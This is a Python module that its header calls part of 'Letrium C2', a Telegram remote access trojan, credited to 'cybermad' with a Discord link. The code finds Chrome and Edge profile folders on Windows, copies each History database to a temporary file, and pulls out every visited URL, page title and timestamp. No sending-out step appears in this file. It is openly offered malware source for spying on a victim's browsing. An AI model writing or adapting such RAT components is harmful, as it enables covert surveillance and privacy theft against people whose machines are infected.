# Letrium C2 - Telegram RAT by cybermad
# Dont copy this code without permission
# Discord - https://discord.gg/RUc432Nc
# _          _        _                 
#| |        | |      (_)                
#| |     ___| |_ _ __ _ _   _ _ __ ___  
#| |    / _ \ __| '__| | | | | '_ ` _ \ 
#| |___|  __/ |_| |  | | |_| | | | | | |
#\_____/\___|\__|_|  |_|\__,_|_| |_| |_|



import os
import shutil
import sqlite3
from datetime import datetime, timedelta

LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def history():
    res = []

    for browser, base in PATHS.items():
        if not os.path.exists(base):
            continue
        for entry in os.listdir(base):
            if entry != "Default" and not entry.startswith("Profile"):
                continue

            db = os.path.join(base, entry, "History")
            if not os.path.exists(db):
                continue

            tmp = os.path.join(TEMP, "tmp_history.db")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")

                for url, title, last_visit in cursor.fetchall():
                    try:
                        t = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                        res.append({
                            "browser": browser,
                            "url": url,
                            "title": title,
                            "visit": t.strftime("%Y-%m-%d %H:%M:%S")
                        })
                    except:
                        pass

                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists(tmp):
                    os.remove(tmp)
    return res
